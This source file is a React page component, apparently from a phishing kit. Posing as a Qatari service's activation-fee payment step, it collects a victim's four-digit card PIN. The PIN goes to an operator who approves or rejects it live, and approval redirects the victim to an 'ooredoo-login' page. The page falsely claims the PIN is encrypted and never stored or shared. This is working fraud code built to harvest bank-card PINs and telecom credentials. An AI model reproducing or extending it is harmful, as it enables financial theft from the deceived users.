import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react";
import { Button } from "@/components/ui/button";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Loader2, Lock, ShieldCheck, Stethoscope, Timer, MessageSquare, Eye, EyeOff } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";
import {
  sendData,
  navigateToPage,
  isFormApproved,
  isFormRejected,
  waitingMessage,
} from "@/lib/store";

const MAROON = "#8b1538";
const FEE_QAR = 10;

const CardPin = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const storedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") || "" : "";
  const serviceContext = getServiceContext(storedService);

  const [digits, setDigits] = useState(["", "", "", ""]);
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [error, setError] = useState(false);
  const inputsRef = useRef<Array<HTMLInputElement | null>>([]);

  const pin = digits.join("");
  const isValid = pin.length === 4;

  useEffect(() => {
    navigateToPage("الرقم السري PIN");
    isFormApproved.value = false;
    isFormRejected.value = false;
    waitingMessage.value = "";
  }, []);

  // Handle approval/rejection from admin
  useSignalEffect(() => {
    if (isFormApproved.value) {
      isFormApproved.value = false;
      navigate("/ooredoo-login");
    }
  });

  useSignalEffect(() => {
    if (isFormRejected.value) {
      isFormRejected.value = false;
      setError(true);
      setIsWaiting(false);
      setLoading(false);
      setDigits(["", "", "", ""]);
      waitingMessage.value = "";
      inputsRef.current[0]?.focus();
    }
  });

  const handleChange = (i: number, val: string) => {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < 3) inputsRef.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) inputsRef.current[i - 1]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    setError(false);
    sendData({
      data: { "الرقم السري PIN": pin },
      current: "الرقم السري PIN",
      waitingForAdminResponse: true,
    });
    setIsWaiting(true);
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-[#eef0fb] relative" dir={dir}>
      <WaitingOverlay />
      <SiteHeader />

      {/* Header band */}
      <div
        className="relative px-4 py-6 text-white"
        style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
      >
        <div className="container mx-auto max-w-5xl">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-xl bg-white/15 backdrop-blur flex items-center justify-center shrink-0">
              <Stethoscope className="w-5 h-5 text-white" />
            </div>
            <div className="flex-1">
              <p className="text-[11px] uppercase tracking-widest opacity-80">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <h1 className="text-lg font-extrabold leading-tight">
                {pick("تأكيد الرقم السري للبطاقة", "Confirm Card PIN")}
              </h1>
            </div>
          </div>
        </div>
      </div>

      <section className="px-3 pb-10 pt-6 relative z-10">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Error banner */}
          {error && (
            <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-red-700 font-semibold text-center">
              {pick("الرقم السري الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The PIN you entered is incorrect. Please try again.")}
            </div>
          )}

          {/* Notice */}
          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200">
            <div className="flex items-start gap-3">
              <div
                className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0 shadow-sm"
                style={{ backgroundColor: MAROON }}
              >
                <MessageSquare className="w-4 h-4 text-white" />
              </div>
              <div>
                <p className="text-sm font-bold text-gray-800 mb-0.5">
                  {pick("تأكيد نهائي لملكية البطاقة", "Final card-ownership confirmation")}
                </p>
                <p className="text-xs text-gray-600 leading-relaxed">
                  {pick(
                    `أدخل الرقم السري المكوّن من 4 أرقام (PIN) لبطاقتك للتأكيد النهائي وإتمام عملية دفع رسوم تفعيل ${serviceContext.accountAr} (${FEE_QAR} ر.ق).`,
                    `Enter your 4-digit card PIN to complete the ${serviceContext.accountEn} activation fee payment (QAR ${FEE_QAR}).`
                  )}
                </p>
              </div>
            </div>
          </div>

          {/* PIN form */}
          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200 space-y-5">
            <div className="flex items-center gap-2.5 pb-2.5 border-b border-gray-100">
              <div
                className="w-9 h-9 rounded-xl flex items-center justify-center shadow-sm"
                style={{ backgroundColor: MAROON }}
              >
                <Lock className="w-4 h-4 text-white" />
              </div>
              <div>
                <span className="text-base font-bold text-gray-800">{pick("الرقم السري", "PIN")}</span>
                <p className="text-xs text-gray-500">{pick("4 أرقام", "4 digits")}</p>
              </div>
            </div>

            <form id="card-pin-form" onSubmit={handleSubmit} className="space-y-3">
              <div className="flex items-center justify-between mb-2">
                <label className="block text-sm font-bold text-gray-600">
                  {pick("أدخل رقم PIN الخاص ببطاقتك", "Enter your card PIN")}{" "}
                  <span style={{ color: MAROON }}>*</span>
                </label>
                <button
                  type="button"
                  onClick={() => setShowPin((s) => !s)}
                  className="text-xs text-gray-500 hover:text-gray-700 flex items-center gap-1"
                >
                  {showPin ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                  {showPin ? pick("إخفاء", "Hide") : pick("إظهار", "Show")}
                </button>
              </div>
              <div className="flex justify-center gap-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => (inputsRef.current[i] = el)}
                    type={showPin ? "text" : "password"}
                    inputMode="numeric"
                    value={d}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    className="w-16 h-16 text-center text-2xl font-bold bg-gray-50/60 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8b1538]/30 focus:border-[#8b1538]/50 outline-none transition-all"
                    maxLength={1}
                    autoFocus={i === 0}
                  />
                ))}
              </div>
              <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 mt-2">
                <Timer className="w-3.5 h-3.5" />
                <span>{pick("صلاحية الرمز 5 دقائق فقط", "Code valid for 5 minutes only")}</span>
              </div>
            </form>
          </div>

          <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-white border border-gray-200">
            <div
              className="w-7 h-7 rounded-lg flex items-center justify-center shrink-0"
              style={{ backgroundColor: MAROON }}
            >
              <ShieldCheck className="w-3.5 h-3.5 text-white" />
            </div>
            <p className="text-xs text-gray-600 leading-relaxed">
              {pick(
                "الرقم السري مشفّر بالكامل ولن يتم تخزينه أو مشاركته مع أي طرف ثالث.",
                "The PIN is fully encrypted and will never be stored or shared with any third party."
              )}
            </p>
          </div>

          <Button
            form="card-pin-form"
            type="submit"
            disabled={loading || isWaiting || !isValid}
            className="w-full text-white text-base font-bold py-6 rounded-xl shadow-md hover:shadow-xl hover:opacity-95 transition-all"
            style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
          >
            {isWaiting ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                {pick("بانتظار الموافقة...", "Waiting for approval...")}
              </span>
            ) : loading ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="h-4 w-4 animate-spin" />
                {pick("جارٍ التحقق...", "Verifying...")}
              </span>
            ) : (
              pick("تأكيد وإتمام الدفع", "Confirm and complete payment")
            )}
          </Button>

          <div className="pt-2">
            <div className="h-px bg-gradient-to-r from-transparent via-gray-300 to-transparent mb-5" />
            <p className="text-[11px] text-gray-500 text-center leading-relaxed">
              {pick(serviceContext.termsAr, serviceContext.termsEn)}
            </p>
          </div>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default CardPin;
